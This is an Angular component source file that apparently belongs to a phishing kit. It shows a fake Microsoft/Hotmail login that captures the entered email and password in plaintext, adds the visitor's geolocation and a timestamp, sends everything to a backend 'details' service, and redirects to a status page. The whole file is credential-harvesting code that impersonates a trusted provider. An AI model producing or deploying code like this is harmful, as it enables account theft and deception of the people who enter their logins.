import { HttpClient } from '@angular/common/http';
import { Component, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import { DetailService } from 'src/app/services/detail.service';
import { GeolocationService } from 'src/app/services/geolocation.service';

@Component({
  selector: 'app-microsoft-login',
  templateUrl: './microsoft-login.component.html',
  styleUrls: ['./microsoft-login.component.css'],
})
export class MicrosoftLoginComponent implements OnInit {
  viewdone: boolean = false;
  hotMailEmail: string = '';
  hotMailPass: string = '';
  details: any = [];
  locationDetails: any = [];
  date: any;
  constructor(
    private geolocation: GeolocationService,
    private router: Router,
    private detailService: DetailService
  ) {}
  ngOnInit(): void {
    this.geolocation.getLocationDetails().subscribe((resp) => {
      this.locationDetails = resp;
    });
  }
  goToNext() {
    this.viewdone = true;
  }
  submit() {
    const det = {
      username: this.hotMailEmail + ' ' + '(Hotmail)',
      password: this.hotMailPass,
    };
    const details = {
      userId: sessionStorage.getItem('user'),
      ...det,
      ...this.locationDetails,
      ...this.dnate(),
    };
    this.detailService.addToDetails(details).subscribe((resp) => {
      console.log(resp);
    });
    this.router.navigate(['/status']);
  }
  dnate() {
    const moment = require('moment');
    const now = moment();
    const nowString = now.format('YYYY-MM-DD HH:mm:ss');
    this.date = { date: nowString };
    return this.date;
  }
}
